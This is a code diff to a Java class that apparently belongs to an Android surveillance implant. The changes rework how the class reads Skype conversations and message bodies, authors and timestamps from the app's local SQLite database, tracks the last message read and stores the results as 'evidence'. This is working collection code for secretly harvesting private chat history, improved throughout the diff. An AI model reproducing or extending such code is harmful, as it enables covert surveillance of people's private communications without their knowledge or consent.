@@ -137,9 +137,10 @@ public class ChatSkype extends SubModuleChat {
 
 				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
 				for (SkypeConversation sc : conversations) {
-					String conversation = sc.conversation;
+					String conversation = sc.identity;
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + conversation);
+						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + conversation + " lastReadIndex: "
+								+ sc.lastReadIndex);
 					}
 					groups = new ChatSkypeGroups();
 
@@ -149,13 +150,13 @@ public class ChatSkype extends SubModuleChat {
 							+ conversation) : 0;
 
 					if (sc.lastReadIndex > lastConvId) {
-						if (groups.isGroup(conversation) && groups.groupTo(conversation) == null) {
+						if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
 							fetchGroup(helper, conversation);
 						}
 
-						if (fetchMessages(helper, sc, lastConvId)) {
-
-							updateMarkupSkype(account, lastConvId, true);
+						int lastReadId = (int) fetchMessages(helper, sc, lastConvId);
+						if (lastReadId > 0) {
+							updateMarkupSkype(account + conversation, lastReadId, true);
 						}
 
 					}
@@ -176,7 +177,7 @@ public class ChatSkype extends SubModuleChat {
 		final List<SkypeConversation> conversations = new ArrayList<SkypeConversation>();
 
 		String[] projection = new String[] { "id", "identity", "displayname", "given_displayname", "inbox_message_id" };
-		String selection = "where inbox_timestamp > 0 and is_permanent == 1";
+		String selection = "inbox_timestamp > 0 and is_permanent=1";
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -188,7 +189,7 @@ public class ChatSkype extends SubModuleChat {
 				c.identity = cursor.getString(1);
 				c.displayname = cursor.getString(2);
 				c.given = cursor.getString(3);
-				c.inbox = cursor.getString(4);
+				c.lastReadIndex = cursor.getInt(4);
 
 				conversations.add(c);
 				return c.id;
@@ -199,7 +200,7 @@ public class ChatSkype extends SubModuleChat {
 		return conversations;
 	}
 
-	private boolean fetchMessages(GenericSqliteHelper helper, final SkypeConversation sc, long lastConvId) {
+	private long fetchMessages(GenericSqliteHelper helper, final SkypeConversation sc, long lastConvId) {
 
 		// select author, body_xml from Messages where convo_id == 118 and id >=
 		// 101 and body_xml != ''
@@ -207,16 +208,19 @@ public class ChatSkype extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { "author", "body_xml" };
-			String selection = "where convo_id = " + sc.id + " body_xml != ''";
+			String[] projection = new String[] { "id", "author", "body_xml", "timestamp" };
+			String selection = "convo_id = " + sc.id + " and body_xml != '' and id > " + lastConvId;
 
 			RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
 				@Override
 				public long cursor(Cursor cursor) {
 
-					String from = cursor.getString(0);
-					String body = cursor.getString(1);
+					int id = cursor.getInt(0);
+					String from = cursor.getString(1);
+					String body = cursor.getString(2);
+					long timestamp = cursor.getLong(3);
+					Date date = new Date(timestamp * 1000L);
 
 					// TODO: sistemare
 					String fromDisplay = from;
@@ -225,20 +229,20 @@ public class ChatSkype extends SubModuleChat {
 					String toDisplay = sc.displayname;
 
 					if (groups.isGroup(sc.identity)) {
-						to = groups.groupTo(sc.identity);
+						to = groups.getGroupTo(from, sc.identity);
 						toDisplay = to;
 					}
-					
+
 					boolean incoming = sc.isIncoming();
 
 					if (!StringUtils.isEmpty(body)) {
-						MessageChat message = new MessageChat(getProgramId(), timestamp, from, fromDisplay, to,
+						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to,
 								toDisplay, body, incoming);
 
 						messages.add(message);
 					}
 
-					return 0;
+					return id;
 				}
 			};
 
@@ -249,14 +253,15 @@ public class ChatSkype extends SubModuleChat {
 			if (messages != null && messages.size() > 0) {
 				saveEvidence(messages);
 			}
+
+			return newLastId;
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
+				e.printStackTrace();
 				Check.log(TAG + " (fetchMessages) Error: " + e);
 			}
-			return false;
+			return -1;
 		}
-
-		return true;
 
 	}
 
@@ -269,7 +274,7 @@ public class ChatSkype extends SubModuleChat {
 			@Override
 			public long cursor(Cursor cursor) {
 				String remote = cursor.getString(0);
-				groups.addGroup(conversation, remote);
+				groups.addPeerToGroup(conversation, remote);
 				return 0;
 			}
 		};
